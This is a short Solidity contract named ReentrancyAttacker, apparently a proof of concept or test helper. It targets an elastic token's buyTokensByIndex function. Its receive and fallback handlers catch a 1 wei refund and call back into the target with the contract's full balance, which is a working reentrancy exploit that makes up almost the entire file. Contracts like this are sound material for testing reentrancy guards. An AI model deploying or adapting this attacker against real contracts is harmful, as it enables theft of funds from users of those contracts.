// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IElasticToken {
    function buyTokensByIndex(uint256 symbolId, uint256 minTokensOut) external payable returns (uint256);
}

contract ReentrancyAttacker {
    IElasticToken public immutable token;
    bool public isReentering;
    
    constructor(address _token) {
        token = IElasticToken(_token);
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether, "Need ETH");
        isReentering = false;
        token.buyTokensByIndex{value: 1 ether}(1, 0);
    }
    
    receive() external payable {
        // If we receive the 1 wei refund and haven't tried reentering yet
        if (msg.value == 1 wei && !isReentering) {
            isReentering = true;
            // Try to reenter with remaining balance
            token.buyTokensByIndex{value: address(this).balance}(1, 0);
        }
    }

    // Add fallback in case receive isn't called
    fallback() external payable {
        if (msg.value == 1 wei && !isReentering) {
            isReentering = true;
            token.buyTokensByIndex{value: address(this).balance}(1, 0);
        }
    }
}
